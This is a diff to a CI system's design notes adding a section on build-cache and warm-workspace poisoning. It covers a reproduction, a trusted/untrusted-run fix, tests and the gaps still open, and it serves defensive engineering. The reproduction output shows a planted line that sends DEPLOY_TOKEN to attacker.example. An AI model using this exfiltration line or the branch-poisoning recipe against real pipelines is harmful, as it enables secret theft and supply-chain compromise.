@@ -988,3 +988,90 @@ is the server cache (P4). Still unbounded on a worker: git mirrors (1.7 GB here,
 the worker's blob cache (89 MB), and Docker images and BuildKit cache, which Pit leaves to
 `docker system prune`. The budget is checked every ten minutes, so a burst can overshoot it in
 between, and a worker whose disk is full still claims jobs.
+
+## P20. A branch poisons the cache (and the warm workspace) that main uses
+
+**Pain.** If any build that runs can also write to the shared cache, a pull request can store
+a crafted result under the key main will later compute, and main restores it. Adnan Khan's
+[Cacheract](https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/)
+([code](https://github.com/adnaneKhan/cacheract)) made this a turnkey attack on GitHub Actions
+caches. It has been used against Angular, against Cline's releases
+([Clinejection](https://adnanthekhan.com/posts/clinejection/),
+[Snyk](https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/)), and
+against npm packages with 36M weekly installs
+([Lupin & Holmes](https://www.landh.tech/blog/20251003-36m-installs/)); see also
+[Neciu Dan](https://neciudan.dev/github-actions-poisoning). CVE-2025-36852 ("CREEP") is the
+same flaw in build caches: Nx, Turborepo and Bazel remote caches shared by PRs and main
+([Cachely on Nx](https://cachely.dev/nx-remote-cache),
+[Turborepo](https://cachely.dev/turborepo-remote-cache),
+[Bazel](https://cachely.dev/bazel-remote-cache),
+[dev.to](https://dev.to/rerodrigues/how-to-prevent-cache-poisoning-in-nx-and-lerna-monorepos-5f5g)).
+The standard advice: only trusted CI writes what main reads. Persistent self-hosted runners have
+the same problem with files: GitHub says they "can be persistently compromised by untrusted
+code" ([GitHub docs](https://docs.github.com/en/actions/reference/security/secure-use),
+[community#26722](https://github.com/orgs/community/discussions/26722),
+[tenki](https://tenki.cloud/blog/self-hosted-runners-arc-security-guide),
+[dev.to threat model](https://dev.to/kozhevniko/self-hosted-ci-runners-are-shared-secrets-threat-modelling-your-build-infrastructure-2ji3)).
+
+Pit had both problems: one cache for every run, and warm workspaces shared by every run of a
+repo and group, with ignored files kept between runs by design.
+
+**Reproduction** (`/tmp/painhunt/p20`): `build` runs `sh scripts/build.sh` with
+`inputs: ["src/**"]`. That is a common shortcut, and it means the script is not in the key.
+Branch `evil` changes the script to write a token-stealing `dist/app.js` and to drop
+`node_modules/.evil` into the workspace. The attacker runs `pit run` on the branch. Then a
+harmless docs change goes through the merge queue. `check` prints `dist/app.js` and reports
+whether the planted file exists.
+
+**Before** (research/pain-hunt at P19), both trusted runs used the attacker's build. Main's
+`scripts/build.sh` still copies `src/app.js`:
+
+```
+queue run      (2 tasks, 1 cached)  dist: fetch("https://attacker.example/?t=" + process.env.DEPLOY_TOKEN)
+                                    workspace: POISONED (planted by branch evil)
+post-merge run (2 tasks, 1 cached)  dist: fetch("https://attacker.example/?t=" + process.env.DEPLOY_TOKEN)
+                                    workspace: POISONED (planted by branch evil)
+```
+
+**Fix** (research/pain-hunt): runs are trusted or untrusted.
+- **Trusted:** pushes to the default branch (or `main`/`master`/`trunk`), merge queue runs and
+  post-merge runs.
+- **Untrusted:** PRs, other branches, every `pit run`, anything created through the API, and
+  anything with uncommitted files.
+
+The server decides this when it creates the run. When a worker reads or writes the cache, the
+server works out trust from the job's lease, so neither a worker nor a client can claim it.
+Untrusted runs read trusted results first and their own after that. Their writes go under a
+separate key (`u:<key>`) that trusted runs never read. Untrusted runs also get their own warm
+workspaces (`<group>~untrusted`). Cache entries from before this change could have come from
+anywhere, so they are migrated to the untrusted side. When a trusted run skips an untrusted
+result, it says so: "its only cached result came from an untrusted run (a PR, branch or
+`pit run`), which trusted runs do not reuse".
+
+**After**, in a fresh repo (`/tmp/painhunt/p20b`). The evil branch ran with `--no-cache`, so
+its build really ran and planted the file in its own workspace. Then a docs change went
+through the queue:
+
+```
+untrusted  pit run (evil)   dist: fetch("https://attacker.example/...")   workspace: POISONED
+trusted    queue run        dist: export const answer = 42;               workspace: clean
+trusted    post-merge run   dist: export const answer = 42;               workspace: clean
+workspaces/app-5fe9e6/  default  default~untrusted
+```
+
+Repeat untrusted runs still hit their own cache, so P6's fast local loop keeps working. Covered
+by the e2e test `untrusted_runs_cannot_poison_trusted_ones` and the unit test
+`untrusted_results_are_never_served_to_trusted_runs`.
+
+**Cost.** The first trusted run after a change rebuilds what a PR already built. That is the
+same trade GitHub makes by scoping caches to branches.
+
+**Verdict: PARTIAL.**
+- **Closed:** cache entries and warm workspaces. These are the paths Cacheract and CREEP use.
+- **Open: the host backend.** A task on `host` runs as the worker's user and can still write
+  anywhere: other workspaces, `~/.cargo`, the mirrors. Untrusted code needs `sandbox` or
+  `docker` for this to be a real boundary. Pit does not enforce that yet.
+- **Open: the Turborepo and Bazel caches.** They are still one shared namespace, so tools that
+  write through them need read-only tokens for PRs. Pit has no per-run tokens.
+- **Open: the API token.** Anyone holding it can queue a change, and queue runs are trusted.
+  That adds no new power, since queueing is how code reaches main.
